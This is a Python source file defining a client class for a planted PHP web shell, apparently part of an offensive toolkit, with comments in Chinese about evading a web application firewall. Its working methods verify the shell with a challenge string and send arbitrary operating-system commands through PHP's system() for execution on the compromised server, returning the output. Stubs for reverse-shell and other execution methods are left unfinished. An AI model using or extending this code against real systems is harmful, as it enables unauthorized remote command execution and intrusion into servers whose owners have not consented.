#!/usr/bin/env python
# encoding: utf-8

from core.utils.string_utils.random_string import random_string
from core.utils.http.build_url import build_url
from core.log import Log

import requests
import string

class WebShell():
    url = "http://127.0.0.1/c.php"
    method = "POST"
    password = "c"
    working = False
    def __init__(self, url, method, password):
        self.url = url
        self.method = method
        self.password = password
        self.init(self.url, self.method, self.password)

    def check_working(self, url, method, auth):
        Log.info("Checking whether the webshell is still work...")
        key = random_string(6, string.letters)
        value = random_string(32, string.letters)
        Log.info("Using challenge key : [%s] , value : [%s]" % (key, value))
        method = string.upper(method)
        if method == "POST" or method == "REQUEST":
            Log.info("Using POST method...")
            data = {auth:'var_dump("$_POST[%s]");' % (key), key:value}
            response = requests.post(url, data=data)
        elif method == "GET":
            Log.info("Using GET method...")
            params = {auth:'var_dump("$_POST[%s]");' % key}
            url = build_url(url, params)
            data = {key:value}
            response = requests.post(url, data=data)
        else:
            Log.error("Unsupported method!")
            return False
        content = response.content
        return value in content

    def check_connection(self, url):
        Log.info("Checking the connection to the webshell...")
        try:
            response = requests.head(url)
            code = response.status_code
            if code != 200:
                Log.warning("The status code is %d, the webshell may have some problems..." % (response.status_code))
            else:
                Log.success("The status code is %d" % (response.status_code))
            return True
        except:
            Log.error("Connection error!")
            return False

    def init(self, url, method, password):
        if self.check_connection(url):
            self.working = True
        else:
            self.working = False
            return

        if self.check_working(url, method, password):
            Log.success("It works well!")
            self.working = True
        else:
            Log.error("It dead!")
            self.working = False
            return


    def function_call(self, function_name, args):
        # TODO 函数调用 , 可以使用类似回调函数这样的调用方式来绕过WAF
        pass

    def php_code_exec(self, code):
        pass

    def check_function_enable(self, function_name):
        # TODO
        pass

    def auto_exec(self, command):
        # TODO 根据当前环境 , 结合被禁用的函数 , 自动判断使用哪个函数进行命令执行
        return self.php_system(command)

    def php_shell_exec(self, command):
        # TODO
        pass

    def php_system(self, command):
        # TODO
        tick = random_string(3, string.letters)
        token = random_string(32, string.letters)
        if self.method == "POST":
            data = {self.password:"echo '"+token+"';system($_POST["+tick+"]);", tick:command + " 2>&1"}
            response = requests.post(self.url, data=data)
        elif self.method == "GET":
            params = {self.password:"echo '"+token+"';system($_GET["+tick+"]);", tick:command + " 2>&1"}
            response = requests.get(self.url, params=params)
        else:
            return (False, "Unsupported method!")
        content = response.text
        if token in content:
            return (True, content.replace(token, ""))
        else:
            return (False, content)

    def php_popen(self, command):
        # TODO
        pass

    def php_proc_open(self, command):
        # TODO
        pass

    def php_exec(self, command):
        # TODO
        pass

    def php_passthru(self, command):
        # TODO
        pass

    def reverse_shell(self, command):
        # TODO
        pass
